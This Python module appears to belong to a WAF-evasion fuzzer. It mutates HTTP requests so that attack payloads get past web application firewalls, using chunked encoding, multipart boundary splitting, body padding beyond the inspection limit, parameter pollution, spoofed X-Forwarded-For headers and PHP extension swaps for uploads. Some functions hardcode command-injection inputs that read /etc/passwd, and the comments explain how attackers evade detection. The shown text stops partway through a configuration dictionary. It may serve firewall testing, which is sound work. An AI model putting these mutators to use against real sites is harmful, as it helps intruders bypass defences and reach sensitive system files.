import copy
import itertools
import json
import os
import random
import re
import urllib.parse
import uuid
if __name__ == "__main__":
    import sys
    sys.path.append(os.path.join(os.path.dirname(__file__), '../'))
from utils.logUtils import LoggerSingleton
from utils.dictUtils import content_types
logger = LoggerSingleton().get_logger()
TAG = "prowler_mutant_methods.py: "
def mutant_methods_modify_content_type(headers, url, method, data, files):
    logger.info(TAG + "==>mutant_methods_modify_content_type")
    logger.debug(TAG + "==>headers: " + str(headers))
    mutant_payloads = []
    if 'Content-Type' in headers:
        for content_type in content_types:
            headers['Content-Type'] += ';' + content_type
            mutant_payloads.append({
                'headers': headers,
                'url': url,
                'method': method,
                'data': data,
                'files': files
            })
    # else:
    #     for content_type in content_types:
    #         headers['Content-Type'] =  ';'+content_type + ';'
    #         mutant_payloads.append({
    #             'headers': headers,
    #             'url': url,
    #             'method': method,
    #             'data': data,
    #             'files': files
    #         })        
    return mutant_payloads




def mutant_methods_change_request_method(headers, url, method, data, files):
    logger.info(TAG + "==>mutant_methods_change_request_method")
    logger.debug(TAG + "==>headers: " + str(headers))
    if method == 'GET':
        # 解析 URL 和查询参数
        parsed_url = urllib.parse.urlparse(url)
        get_params = urllib.parse.parse_qs(parsed_url.query)
        # add     "Content-Type": "application/x-www-form-urlencoded" to headers
        headers['Content-Type'] = 'application/x-www-form-urlencoded'
        # 构建新的 POST 请求
        post_url = f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}"
        post_url = post_url.replace('get', 'post')
        post_data = {k: v[0] for k, v in get_params.items()}  # 将查询参数变成 POST 数据
        return headers, post_url, 'POST', post_data, files,True
    else:
        return headers, url, method, data, files,False



# 协议未覆盖绕过
# 在 http 头里的 Content-Type 提交表单支持四种协议：
# •application/x-www-form-urlencoded -编码模式
# •multipart/form-data -文件上传模式
# •text/plain -文本模式
# •application/json -json模式
# 文件头的属性是传输前对提交的数据进行编码发送到服务器。其中 multipart/form-data 
# 表示该数据被编码为一条消息,页上的每个控件对应消息中的一个部分。所以，当 waf 没有规则匹配该协议传输的数据时可被绕过。
def mutant_methods_fake_content_type(headers,url,method,data,files):
    logger.info(TAG + "==>mutant_methods_fake_content_type")
    logger.debug(TAG + "==>headers: " + str(headers))
    mutant_payloads = []
    if 'Content-Type' in headers:
        for content_type in content_types:
            headers['Content-Type'] = content_type + ';'
            mutant_payloads.append({
                'headers': headers,
                'url': url,
                'method': method,
                'data': data,
                'files': files
            })

    return mutant_payloads


def random_case(text):
    """Randomly changes the case of each character in the text."""
    return ''.join([c.upper() if random.choice([True, False]) else c.lower() for c in text])

def insert_comments(text):
    """Insert random comments or spaces in the text to break up keywords."""
    parts = list(text)
    for i in range(1, len(parts) - 1):
        if random.choice([True, False]):
            parts[i] = '/*' + parts[i] + '*/'
    return ''.join(parts)

def mutant_methods_case_and_comment_obfuscation(headers, url, method, data, files):
    logger.info(TAG + "==>mutant_methods_case_and_comment_obfuscation")
    logger.debug(TAG + "==>headers: " + str(headers))

    mutant_payloads = []

    # Apply random case and comment obfuscation to the URL
    parsed_url = urllib.parse.urlparse(url)
    obfuscated_path = random_case(insert_comments(parsed_url.path))
    obfuscated_query = random_case(insert_comments(parsed_url.query))
    mutated_url = urllib.parse.urlunparse(parsed_url._replace(path=obfuscated_path, query=obfuscated_query))

    # Apply the same to data if it's a string
    mutated_data = data
    if isinstance(data, str):
        mutated_data = random_case(insert_comments(data))

    # Apply the same to file names if present
    mutated_files = files
    if files:
        mutated_files = {name: (random_case(insert_comments(filename)), file) for name, (filename, file) in files.items()}

    # Create the mutated payload
    mutant_payloads.append({
        'headers': headers,
        'url': mutated_url,
        'method': method,
        'data': mutated_data,
        'files': mutated_files
    })

    return mutant_payloads

def url_encode_payload(payload):
    """Helper function to URL encode a given payload."""
    return urllib.parse.quote(payload, safe='/:&?=')

def mutant_methods_url_encoding(headers, url, method, data, files):
    logger.info(TAG + "==>mutant_methods_url_encoding")
    logger.debug(TAG + "==>headers: " + str(headers))

    # Create a list to hold the mutated payloads
    mutant_payloads = []

    # URL encode only the query parameters or other parts of the URL
    parsed_url = urllib.parse.urlparse(url)
    encoded_query = urllib.parse.quote(parsed_url.query, safe='=&')
    encoded_path = urllib.parse.quote(parsed_url.path, safe='/')
    mutated_url = urllib.parse.urlunparse(parsed_url._replace(path=encoded_path, query=encoded_query))
    
    # URL encode the data if it's a string
    mutated_data = data
    if isinstance(data, str):
        mutated_data = url_encode_payload(data)

    # URL encode file names if present
    mutated_files = {}
    if files:
        try:
            mutated_files = {name: (url_encode_payload(filename), file) for name, (filename, file) in files.items()}
        except ValueError:
            logger.warning(TAG + "Error in mutant_methods_url_encoding: could not URL encode file names.")
            logger.warning(TAG + "Invalid structure in 'files'; expected dictionary values to be tuples of two elements.")

    # Create the mutated payload
    mutant_payloads.append({
        'headers': headers,
        'url': mutated_url,
        'method': method,
        'data': mutated_data if mutated_data is not None else data,
        'files': mutated_files if mutated_files is not None else files
    })

    return mutant_payloads



def mutant_upload_methods_double_equals(headers,url,method,data,files):
    logger.info(TAG + "==>mutant_upload_methods_double_equals")
    logger.debug(TAG + "==>headers: " + str(headers))
    if isinstance(data, bytes):
        
        data_str = data.decode()
    else:
        data_str = data
    mutant_payloads = []
    # 只有 multipart/form-data 才需要可以使用这个方法
    content_type = headers.get('Content-Type')
    if content_type and re.match('multipart/form-data', content_type) or 'filename' in str(data):
        if 'filename' in data_str:
            data_str = data_str.replace('filename', 'filename=')
            mutant_payloads.append({
                        'headers': headers,
                        'url': url,
                        'method': method,
                        'data': data_str
                    })
    else:
        logger.info(TAG + "data is" + str(data))
        logger.info(TAG + "No filename found in data")
    # if files:
    #     if 'filename' in files:
    #         files['filename'] = files['filename'] + "="
    #         mutant_payloads.append({
    #             'headers': headers,
    #             'url': url,
    #             'method': method,
    #             'data': data,
    #             'files': files
    #         })

    return mutant_payloads

def unicode_obfuscate(text):
    """Helper function to encode ASCII characters into their Unicode equivalent."""
    obfuscated_text = ""
    for char in text:
        if random.choice([True, False]):
            # 50% chance to obfuscate each character
            obfuscated_text += '\\u{:04x}'.format(ord(char))
        else:
            obfuscated_text += char
    return obfuscated_text

def mutant_methods_unicode_normalization(headers, url, method, data, files):
    logger.info(TAG + "==>mutant_methods_unicode_normalization")
    logger.debug(TAG + "==>headers: " + str(headers))

    mutant_payloads = []

    # Apply Unicode obfuscation to URL path and query
    parsed_url = urllib.parse.urlparse(url)
    obfuscated_path = unicode_obfuscate(parsed_url.path)
    obfuscated_query = unicode_obfuscate(parsed_url.query)
    mutated_url = urllib.parse.urlunparse(parsed_url._replace(path=obfuscated_path, query=obfuscated_query))

    # Apply Unicode obfuscation to the data if it's a string
    mutated_data = data
    if isinstance(data, str):
        mutated_data = unicode_obfuscate(data)

    # Apply Unicode obfuscation to file names if present
    mutated_files = files
    if files:
        mutated_files = {name: (unicode_obfuscate(filename), file) for name, (filename, file) in files.items()}

    # Create the mutated payload
    mutant_payloads.append({
        'headers': headers,
        'url': mutated_url,
        'method': method,
        'data': mutated_data,
        'files': mutated_files
    })

    return mutant_payloads
def insert_line_breaks(text):
    """Helper function to insert CR/LF characters randomly in the text."""
    obfuscated_text = ""
    for char in text:
        if random.choice([True, False]):
            obfuscated_text += '%0A'  # LF (Line Feed)
        obfuscated_text += char
    return obfuscated_text
def mutant_methods_line_breaks(headers, url, method, data, files):
    logger.info(TAG + "==>mutant_methods_line_breaks")
    logger.debug(TAG + "==>headers: " + str(headers))

    mutant_payloads = []

    # Apply line breaks to URL path and query
    parsed_url = urllib.parse.urlparse(url)
    obfuscated_path = insert_line_breaks(parsed_url.path)
    obfuscated_query = insert_line_breaks(parsed_url.query)
    mutated_url = urllib.parse.urlunparse(parsed_url._replace(path=obfuscated_path, query=obfuscated_query))

    # Apply line breaks to the data if it's a string
    mutated_data = data
    if isinstance(data, str):
        mutated_data = insert_line_breaks(data)

    # Apply line breaks to file names if present
    mutated_files = {}
    if files:
        try:
            mutated_files = {name: (insert_line_breaks(filename), file) for name, (filename, file) in files.items()}
        except ValueError:
            logger.warning(TAG + "Error in mutant_methods_line_breaks")
            logger.warning(TAG + "Invalid structure in 'files'; expected dictionary values to be tuples of two elements.")
    # Create the mutated payload
    mutant_payloads.append({
        'headers': headers,
        'url': mutated_url,
        'method': method,
        'data': mutated_data,
        'files': mutated_files
    })

    return mutant_payloads
def mutant_methods_for_test_use(headers, url, method, data, files):
    logger.info(TAG + "==>mutant_methods_for_test_use")
    # logger.debug(TAG + "==>headers: " + str(headers))

    mutant_payloads = []
    if data:
        print(data)
        # replace cmd to c%0Amd in data
        data = data.replace('cmd', 'c%0Amd')
        data = data.replace('passwd', 'passw%0Ad')
        data = data.replace('SELECT','se/*comment*/lect')
        print(data)

        # exit()
    url = url.replace('cmd', 'c%0Amd')
    url = url.replace('SELECT','se/*comment*/lect')
    url = url.replace('passwd', 'passw%0Ad')
    print(url)
    mutant_payloads.append({
        'headers': headers,
        'url': url,
        'method': method,
        'data': data,
        'files': files
    })
    logger.debug(TAG + "==>mutant_payloads: " + str(mutant_payloads))
    return mutant_payloads

def mutant_methods_change_extensions(headers, url, method, data, files):
    """
    生成不同的 Content-Type 和字符集变体

    """
    logger.info(TAG + "==>mutant_methods_change_charset")
    # logger.debug(TAG + "==>headers: " + str(headers))

    mutant_payloads = []

    valid_extensions = ['phtml', 'php', 'php3', 'php4', 'php5', 'inc','pHtml', 'pHp', 'pHp3', 'pHp4', 'pHp5', 'iNc']
    extensions_choice=random.choice(valid_extensions)
    if isinstance(data,bytes):
        data=data.decode('utf-8').replace('php','php5').encode('utf-8')
   
    mutant_payloads.append({
        'headers': headers,
        'url': url,
        'method': method,
        'data': data,
        'files': files
    })

    logger.debug(TAG + "==>mutant_payloads: " + str(mutant_payloads))

    return mutant_payloads


def mutant_methods_change_charset(headers, url, method, data, files):
    """
    生成不同的 Content-Type 和字符集变体

    """
    logger.info(TAG + "==>mutant_methods_change_charset")
    # logger.debug(TAG + "==>headers: " + str(headers))

    mutant_payloads = []


    # Content-Type 变体列表
    content_type_variations = [
        # 标准编码
        "application/x-www-form-urlencoded;charset=ibm037",
        # 多部分表单数据
        "multipart/form-data; charset=ibm037,boundary=blah",
        "multipart/form-data; boundary=blah ; charset=ibm037",
        # 多内容类型
        "text/html; charset=UTF-8 application/json; charset=utf-8",
        
        # 额外的变体
        "application/json;charset=windows-1252",
        "text/plain;charset=iso-8859-1",
        "application/xml;charset=shift_jis",
        
        # 带空格和特殊字符的变体
        # " application/x-www-form-urlencoded ; charset = utf-8 ",
        # "multipart/form-data;  boundary = test-boundary ; charset=gb2312 ",
    ]
    weights = [0.58] + [0.07] * 6
    content_type=random.choices(content_type_variations,weights=weights)[0]

    # content_type=random.choice(content_type_variations)
    # input()
    # 修改请求头中的 Content-Type
    modified_headers = headers.copy()
    # print(modified_headers['Content-Type'])
    modified_headers['Content-Type'] = content_type
    # print(content_type)
    # input()

    
    mutant_payloads.append({
        'headers': modified_headers,
        'url': url,
        'method': method,
        'data': data,
        'files': files
    })

    logger.debug(TAG + "==>mutant_payloads: " + str(mutant_payloads))

    return mutant_payloads
def mutant_methods_add_accept_charset(headers, url, method, data, files):
    """
    生成不同的 Content-Type 和字符集变体

    """
    logger.info(TAG + "==>mutant_methods_change_charset")
    # logger.debug(TAG + "==>headers: " + str(headers))

    mutant_payloads = []


    # 字符集变体列表
    charset_variations = [
        "utf-32; q=0.5",  # 原始要求
        "utf-8; q=1.0",
        "iso-8859-1; q=0.8",
        "windows-1252; q=0.3",
        "utf-16; q=0.7",
        "gb2312; q=0.6",
        "shift_jis; q=0.4",
        "utf-32; q=0.5, utf-8; q=1.0",  # 多字符集
        "* ; q=0.1",  # 通配符
    ]
    
    weights = [0.66] + [0.03] * 8
    content_type= random.choices(charset_variations,weights=weights)[0]
    # 修改请求头中的 Content-Type
    modified_headers = headers.copy()
    # print(modified_headers['Content-Type'])
    modified_headers['Accept-Charset'] = content_type
    # print(headers)
    # print(modified_headers)
    # input()
    mutant_payloads.append({
        'headers': modified_headers,
        'url': url,
        'method': method,
        'data': data,
        'files': files
    })
    

    logger.debug(TAG + "==>mutant_payloads: " + str(mutant_payloads))

    return mutant_payloads


def mutant_methods_fake_IP(headers, url, method, data, files):
    """
    随机向headers中注入IP欺骗相关的头部信息
    
    Args:
        headers (dict): 原始HTTP请求头
    
    Returns:
        dict: 添加了随机IP头部的请求头
    """
    logger.info(TAG + "==>mutant_methods_fake_IP")
    mutant_payloads = []
    # IP欺骗相关的头部列表
    ip_headers = [
        "X-Originating-IP",
        "X-Forwarded-For", 
        "X-Remote-IP", 
        "X-Remote-Addr", 
        "X-Client-IP"
    ]
    
    # 可选的IP地址列表
    ip_addresses = [
        "127.0.0.1",   # 本地回环地址
        "192.168.1.1", # 私有网段
        "10.0.0.1",    # 私有网段
        "172.16.0.1"   # 私有网段
    ]
    
    # 复制原始headers,避免修改原始对象
    modified_headers = headers.copy()
    
    # 随机选择要添加的头部数量(1-3个)
    num_headers_to_add = random.randint(1, 3)
    
    # 随机选择要添加的头部
    selected_headers = random.sample(ip_headers, num_headers_to_add)
    
    # 随机选择IP地址
    for header in selected_headers:
        ip = random.choice(ip_addresses)
        modified_headers[header] = ip
    
    mutant_payloads.append({
        'headers': modified_headers,
        'url': url,
        'method': method,
        'data': data,
        'files': files
    })

    # print(mutant_payloads)
    # input()
    logger.debug(TAG + "==>mutant_payloads: " + str(mutant_payloads))
    return mutant_payloads
    






def mutant_methods_peremeter_pollution_case1(headers, url, method, data, files):
    '''
    服务器使用最后收到的参数, WAF 只检查第一个参数。
    '''
    
    logger.info(TAG + "==>mutant_methods_peremeter_pollution_case1")
    # logger.debug(TAG + "==>headers: " + str(headers))

    mutant_payloads = []


    if data:

        plt_data=""
        if type(data)==str:
            if "=" in data:
                no_poc=random.choice(["ls","1","1.jpg"])
                pere=data.split("=")[0]
                poc=data.split("=")[1]
                for _ in range(3):
                    plt_data+=pere+"="+no_poc+"\n"
                plt_data+=pere+"="+poc  
            if ":" in data:
                no_poc=random.choice(["\"ls\"}","\"1\"}","\"1.jpg\"}"])
                pere=data.split(":")[0]
                poc=data.split(":")[1]
                for _ in range(3):
                    plt_data+=pere+":"+no_poc+"\n"
                plt_data+=pere+":"+poc 
        else:
            plt_data=data
        
    
        mutant_payloads.append({
                'headers': headers,
                'url': url,
                'method': method,
                'data': plt_data,
                'files': files
            })
    else:    
        parsed_url=urllib.parse.urlparse(url)
        base_url = f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}"
        query_params = urllib.parse.parse_qs(parsed_url.query, keep_blank_values=True)
            # 为每个参数创建重复的测试用例
        for param, values in query_params.items():
            original_value = values[0]
        
            # 构造重复参数
            duplicate_params = []
            
            for _ in range(3):  # 创建3个重复参数
                duplicate_params.append((param, "1"))

            duplicate_params.append((param,original_value))
            # 添加其他原始参数
            for other_param, other_values in query_params.items():
                if other_param != param:
                    duplicate_params.append((other_param, other_values[0]))
        
            # 构造新的查询字符串
            query_string = '&'.join(f"{p}={v}" for p, v in duplicate_params)
            test_url = f"{base_url}?{query_string}"
    
            mutant_payloads.append({
                'headers': headers,
                'url': test_url,
                'method': method,
                'data': data,
                'files': files
            })

    logger.debug(TAG + "==>mutant_payloads: " + str(mutant_payloads))
    print(mutant_payloads)
    # input("")
    return mutant_payloads
def mutant_methods_peremeter_pollution_case2(headers, url, method, data, files):
    '''
    服务器将来自相似参数的值合并,WAF 会单独检查它们。
    '''
    logger.info(TAG + "==>mutant_methods_for_test_use")
    # logger.debug(TAG + "==>headers: " + str(headers))

    mutant_payloads = []
    if data:
        plt_data=""
        
        if type(data)==str:
            if "=" in data:
                pere=data.split("=")[0]
                poc=data.split("=")[1]
                point1 = random.randint(1, len(poc) - 2)
                point2 = random.randint(point1 + 1, len(poc) - 1)
                part=[]
                part.append(poc[:point1]) 
                part.append(poc[point1:point2])
                part.append(poc[point2:])
                for i in range(3):
                    plt_data+=pere+"="+part[i]+"\n"
            if ":" in data:

                pere=data.split(":")[0]
                poc=data.split(":")[1]
                point1 = random.randint(1, len(poc) - 2)
                point2 = random.randint(point1 + 1, len(poc) - 1)
                part=[]
                part.append(poc[:point1]) 
                part.append(poc[point1:point2])
                part.append(poc[point2:])
                for i in range(3):
                    plt_data+=pere+":"+part[i]+"\n"
            print(plt_data)

        else:
            plt_data=data
            # pere=data.keys()
            # for pere in list(data.keys()):
            #     poc=data[pere]

    
        mutant_payloads.append({
                'headers': headers,
                'url': url,
                'method': method,
                'data': plt_data,
                'files': files
            })
    else:    
        parsed_url=urllib.parse.urlparse(url)
        base_url = f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}"
        query_params = urllib.parse.parse_qs(parsed_url.query, keep_blank_values=True)
            # 为每个参数创建重复的测试用例
        for param, values in query_params.items():
            original_value = values[0]
        
            # 构造重复参数
            duplicate_params = []
            
            for _ in range(3):  # 创建3个重复参数
                duplicate_params.append((param, "1"))

            duplicate_params.append((param,original_value))
            # 添加其他原始参数
            for other_param, other_values in query_params.items():
                if other_param != param:
                    duplicate_params.append((other_param, other_values[0]))
        
            # 构造新的查询字符串
            query_string = '&'.join(f"{p}={v}" for p, v in duplicate_params)
            test_url = f"{base_url}?{query_string}"
    
            mutant_payloads.append({
                'headers': headers,
                'url': test_url,
                'method': method,
                'data': data,
                'files': files
            })

    logger.debug(TAG + "==>mutant_payloads: " + str(mutant_payloads))
    print(mutant_payloads)
    # input("")
    return mutant_payloads

def mutant_methods_multipart_boundary(headers, url, method, data, files):
    """ 对 boundary 进行变异进而绕过"""
    logger.info(TAG + "==>mutant_methods_multipart_boundary")
    logger.debug(TAG + "==>headers: " + str(headers))
    # 只有 multipart/form-data 才需要可以使用这个方法

    content_type = headers.get('Content-Type')
    if not content_type or not re.match('multipart/form-data', content_type):
        if not 'filename' in str(data):
            return []
    if not isinstance(data, str):
        data_str = data.decode()
    else:
        data_str = data
    pattern = re.compile(r'Content-Disposition: form-data;.*filename="([^"]+)"')
    filenames = pattern.findall(data_str)

    # 从Content-Type中解析boundary的正则表达式
    pattern = re.compile(r'boundary=(.*)')
    match = pattern.search(content_type)
    if match:
        boundary = match.group(1)
        logger.debug(TAG + f"Found boundary: {boundary}")
    else:
        # 无boundary
        logger.info(TAG + "No boundary found in Content-Type")
        return []

    # 拼接后为----realBoundary
    boundary0 = '----real'
    boundary1 = 'Boundary'
    mutant_payloads = []
    # 基于 RFC 2231 的boundary构造
    content_type += f'; boundary*0={boundary0}; boundary*1={boundary1}'

    # 构造新的header
    headers.update({'Content-Type': content_type})
    # 构造请求体，第一种是go的解析方式，第二种是flask的解析方式
    # waf解析的边界
    fake_body = f'--{boundary}\r\n'
    fake_body += f'Content-Disposition: form-data; name="field1"\r\n\r\n'
    fake_body += f'fake data\r\n'
    fake_body += f'--{boundary}--\r\n'

    # 真正的源站解析的边界
    real_body = ['', '']
    for filename in filenames:
        real_body[0] += f'--{boundary0}{boundary1}\r\n'
        real_body[0] += f'Content-Disposition: form-data; name="field2"; filename="{filename}"\r\n'
        real_body[0] += f'Content-Type: text/plain\r\n\r\n'
        real_body[0] += f'real data\r\n'
    real_body[0] += f'--{boundary0}{boundary1}--\r\n'

    for filename in filenames:
        real_body[1] += f'--{boundary}{boundary0}{boundary1}\r\n'
        real_body[1] += f'Content-Disposition: form-data; name="field2"; filename="{filename}"\r\n'
        real_body[1] += f'Content-Type: text/plain\r\n\r\n'
        real_body[1] += f'real data\r\n'
    real_body[1] += f'--{boundary}{boundary0}{boundary1}--\r\n'

    for body in real_body:
        mutant_payloads.append({
            'headers': headers,
            'url': url,
            'method': method,
            'data': data_str+body
        })
    return mutant_payloads

# 资源限制角度绕过WAF
# 超大数据包绕过
# 这是众所周知、而又难以解决的问题。如果HTTP请求POST BODY太大，检测所有的内容，WAF集群消耗太大的CPU、内存资源。因此许多WAF只检测前面的
# 几K字节、1M、或2M。对于攻击者而然，只需要在POST BODY前面添加许多无用数据，把攻击payload放在最后即可绕过WAF检测。
def mutant_methods_add_padding(headers, url, method, data, files):
    """ 绕过WAF的超大数据包检测"""
    logger.info(TAG + "==>mutant_methods_add_padding")
    logger.debug(TAG + "==>headers: " + str(headers))
    mutant_payloads = []
    # 对于上传请求，在headers中添加无用数据
    if files:
        padding_data = 'x' * 1024 * 1
        for name, file_info in files.items():
            file_content = file_info.get('content', '')
            file_info['content'] = padding_data + file_content
        mutant_payloads.append({
            'headers': headers,
            'url': url,
            'method': method,
            'data': data,
            'files': files
        })
        return mutant_payloads
    padding_data = 'x' * 1024  * 1  # 5 kB 的无用数据
    # data must not be a string
    if isinstance(data, bytes) and isinstance(padding_data, str):
        padding_data = padding_data.encode()  # 将 padding_data 转换为字节串
    if isinstance(data, dict):
        from urllib.parse import urlencode
        data = urlencode(data)
    if data:
        data += padding_data
    else:
        data = padding_data
    
    
    mutant_payloads.append({
        'headers': headers,
        'url': url,
        'method': method,
        'data': data,
        'files': files
    })
    return mutant_payloads


# 删除data中的Content-Type
def mutant_methods_delete_content_type_of_data(headers, url, method, data, files):
    """ 删除data中的Content-Type:xxx; """
    logger.info(TAG + "==>mutant_methods_delete_content_type_of_data")
    logger.debug(TAG + "==>headers: " + str(headers))
    mutant_payloads = []
    # 只有 multipart/form-data 才需要可以使用这个方法
    content_type = headers.get('Content-Type')
    if content_type and re.match('multipart/form-data', content_type):
        pattern = r'Content-Type:[^;]+;\s*'
        # 使用re.sub()函数来删除所有匹配的部分
        if not isinstance(data, str):
            data_str = data.decode()
        else:
            data_str = data
        cleaned_data = re.sub(pattern, '', data_str)
        mutant_payloads.append({
            'headers': headers,
            'url': url,
            'method': method,
            'data': cleaned_data
        })
    return mutant_payloads

# 请求头变异,改变Content-Type的大小写
def mutant_methods_modify_content_type_case(headers, url, method, data, files):
    """ 变异Content-Type的大小写"""
    logger.info(TAG + "==>mutant_methods_modify_content_type_case")
    logger.debug(TAG + "==>headers: " + str(headers))
    mutant_payloads = []
    if 'Content-Type' in headers:
        headers['Content-Type'] = headers['Content-Type'].upper()
        mutant_payloads.append({
            'headers': headers,
            'url': url,
            'method': method,
            'data': data,
            'files': files
        })
    return mutant_payloads

# 请求头变异，改变Content-Type这个属性名本身的大小写
def mutant_methods_modify_case_of_content_type(headers, url, method, data, files):
    """ 变异Content-Type这个属性名本身的大小写"""
    logger.info(TAG + "==>mutant_methods_modify_case_of_content_type")
    logger.debug(TAG + "==>headers: " + str(headers))
    mutant_payloads = []
    if 'Content-Type' in headers:
        new_content_type = headers.pop('Content-Type')
        headers['content-type'] = new_content_type
        mutant_payloads.append({
            'headers': headers,
            'url': url,
            'method': method,
            'data': data,
            'files': files
        })
    return mutant_payloads

def mutant_methods_add_Content_Type_for_get_request(headers, url, method, data, files):
    """ 给GET请求添加Content-Type"""
    logger.info(TAG + "==>mutant_methods_add_Content_Type_for_get_request")
    logger.debug(TAG + "==>headers: " + str(headers))
    mutant_payloads = []
    if method == 'GET':
        headers['Content-Type'] = 'application/x-www-form-urlencoded'
        mutant_payloads.append({
            'headers': headers,
            'url': url,
            'method': method,
            'data': data,
            'files': files
        })
    return mutant_payloads

#为形如/rce_get?cmd=cat%20/etc/passwd的GET请求添加无害命令，如cmd=ls;cat%20/etc/passwd
def mutant_methods_add_harmless_command_for_get_request(headers, url, method, data, files):
    """ 为GET请求添加无害命令"""
    logger.info(TAG + "==>mutant_methods_add_harmless_command_for_get_request")
    logger.debug(TAG + "==>headers: " + str(headers))
    mutant_payloads = []

    if method == 'GET':
        if 'cmd' in url:
            url = url.replace('cmd=', 'cmd=ls;')
        mutant_payloads.append({
            'headers': headers,
            'url': url,
            'method': method,
            'data': data,
            'files': files
        })
    return mutant_payloads

'''分块传输绕过
分块传输编码是超文本传输协议（HTTP）中的一种数据传输机制，允许数据分为多个部分，仅在HTTP/1.1中提供。
长度值为十六进制，也可以通过在长度值后面加上分号做注释，来提高绕过WAF的概率
条件
需要在请求头添加 “Transfer-Encoding=chunked” 才支持分块传输'''

def mutant_methods_chunked_transfer_encoding(headers, url, method, data, files):
    """ 使用分块传输编码，并将请求体拆分为更细的块 """
    logger.info(TAG + "==>mutant_methods_chunked_transfer_encoding")
    mutant_payloads = []
    
    # 仅在HTTP/1.1中支持分块传输编码
    if method in ['POST', 'PUT', 'PATCH']:
        mutated_headers = headers.copy()
        mutated_headers['Transfer-Encoding'] = 'chunked'
        if 'Content-Length' in mutated_headers:
            del mutated_headers['Content-Length']
        # 确保使用HTTP/1.1版本
        mutated_headers['Protocol-Version'] = 'HTTP/1.1'
    
        # 构造分块传输编码的请求体
        def chunked_body(data):
            body = ''
            if data:
                if isinstance(data, dict):
                    from urllib.parse import urlencode
                    data = urlencode(data)
                data = data if isinstance(data, str) else data.decode('utf-8')
                # 将数据拆分为更细的块，例如每个块1个字符
                chunk_size = 1  # 每个块的大小，可以调整为更小的值
                for i in range(0, len(data), chunk_size):
                    chunk = data[i:i+chunk_size]
                    chunk_length = format(len(chunk), 'x')
                    # 可选择在长度值后添加注释
                    chunk_length_with_comment = chunk_length + ";"
                    body += chunk_length_with_comment + "\r\n"
                    body += chunk + "\r\n"
            # 添加结束块
            body += "0\r\n\r\n"
            return body
    
        mutated_data = chunked_body(data)
    
        mutant_payloads.append({
            'headers': mutated_headers,
            'url': url,
            'method': method,
            'data': mutated_data,
            'files': files
        })
    return mutant_payloads


# 把content-type的值替换为multipart/form-data当作一个载荷
def mutant_methods_multipart_form_data(headers, url, method, data, files):
    """ 使用multipart/form-data编码发送普通参数，并可选添加charset参数 """
    logger.info(TAG + "==>mutant_methods_multipart_form_data")
    mutant_payloads = []

    if method in ['POST', 'PUT', 'PATCH']:
        mutated_headers = copy.deepcopy(headers)

        # 生成随机的boundary
        boundary = '----WebKitFormBoundary' + uuid.uuid4().hex[:16]
        # 可选地在Content-Type后添加charset参数
        charset_options = ['', ', charset=ibm500', ', charset=ibm037']

        for charset in charset_options:
            content_type = f'multipart/form-data; boundary={boundary}{charset}'
            mutated_headers['Content-Type'] = content_type

            # 构造multipart/form-data请求体
            multipart_data = ''
            if data:
                if isinstance(data, dict):
                    for name, value in data.items():
                        multipart_data += f'--{boundary}\r\n'
                        multipart_data += f'Content-Disposition: form-data; name="{name}"\r\n\r\n'
                        multipart_data += f'{value}\r\n'
                elif isinstance(data, str):
                    multipart_data += f'--{boundary}\r\n'
                    multipart_data += f'Content-Disposition: form-data; name="data"\r\n\r\n'
                    multipart_data += f'{data}\r\n'
            if files:
                for name, file_info in files.items():
                    filename = file_info.get('filename', 'file.txt')
                    file_content = file_info.get('content', '')
                    multipart_data += f'--{boundary}\r\n'
                    multipart_data += f'Content-Disposition: form-data; name="{name}"; filename="{filename}"\r\n'
                    multipart_data += f'Content-Type: application/octet-stream\r\n\r\n'
                    multipart_data += f'{file_content}\r\n'
            # 添加结束boundary
            multipart_data += f'--{boundary}--\r\n'

            # 更新Content-Length
            mutated_headers['Content-Length'] = str(len(multipart_data))

            mutant_payloads.append({
                'headers': mutated_headers,
                'url': url,
                'method': method,
                'data': multipart_data,
                'files': None  # 已经在multipart_data中处理
            })
    return mutant_payloads

# SQL注释符号绕过
def mutant_methods_sql_comment_obfuscation(headers, url, method, data, files):
    """ 在SQL查询中插入注释来进行混淆 """
    logger.info(TAG + "==> mutant_methods_sql_comment_obfuscation")
    logger.debug(TAG + "==>headers: " + str(headers))
    
    mutant_payloads = []
    if method == 'GET':
        # 插入SQL注释到URL中
        obfuscated_url = url.replace(" ", "/**/").replace("%20", "/**/")
        # 使用SQL注释符号来替换空格
        
        # 添加变异后的请求
        mutant_payloads.append({
            'headers': headers,
            'url': obfuscated_url,
            'method': method,
            'data': data,
            'files': files
        })
    
    return mutant_payloads

def mutant_methods_convert_get_to_post(headers, url, method, data, files):
    """ 将GET请求转换为POST请求 """
    logger.info(TAG + "==>mutant_methods_convert_get_to_post")
    logger.debug(TAG + "==>headers: " + str(headers))
    mutant_payloads = []
    if method == 'GET':
        # 将GET请求转换为POST请求
        mutated_method = 'POST'
        # 提取GET请求的参数
        query = urllib.parse.urlparse(url).query
        url = url.split('?')[0]
        url = url.replace('get', 'post')
        data = {'cmd': 'cat /etc/passwd'}
        # add htest parameters to headers
        headers['content-type'] = 'application/x-www-form-urlencoded'
        headers.pop('Content-Type', None)
        # 将GET请求的参数添加到data中
        # data = urllib.parse.urlencode(data)
        mutant_payloads.append({
            'headers': headers,
            'url': url,
            'method': mutated_method,
            'data': data,
            'files': files
        })
    return mutant_payloads
'''
ALL MUTANT METHODS:
mutant_methods_modify_content_type
mutant_methods_fake_content_type
mutant_methods_case_switching
mutant_methods_url_encoding
mutant_methods_unicode_normalization
mutant_methods_line_breaks
mutant_methods_add_padding
mutant_methods_multipart_boundary
mutant_upload_methods_double_equals
mutant_methods_delete_content_type_of_data
mutant_methods_modify_content_type_case
mutant_methods_modify_case_of_content_type
mutant_methods_add_Content_Type_for_get_request
mutant_methods_add_harmless_command_for_get_request
mutant_methods_chunked_transfer_encoding
mutant_methods_multipart_form_data
mutant_methods_sql_comment_obfuscation
mutant_methods_convert_get_to_post
mutant_methods_peremeter_pollution_case1
mutant_methods_peremeter_pollution_case2
mutant_methods_fake_IP
mutant_methods_change_charset
mutant_methods_add_accept_charset
mutant_methods_change_extensions
'''
# 为变异方法添加开关
mutant_methods_config = {
    "mutant_methods_modify_content_type": (mutant_methods_modify_content_type, True),
    "mutant_methods_fake_content_type": (mutant_methods_fake_content_type, True),
    "mutant_methods_case_and_comment_obfuscation": (mutant_methods_case_and_comment_obfuscation, False),
    "mutant_methods_url_encoding": (mutant_methods_url_encoding, True),
    "mutant_methods_unicode_normalization": (mutant_methods_unicode_normalization, False),
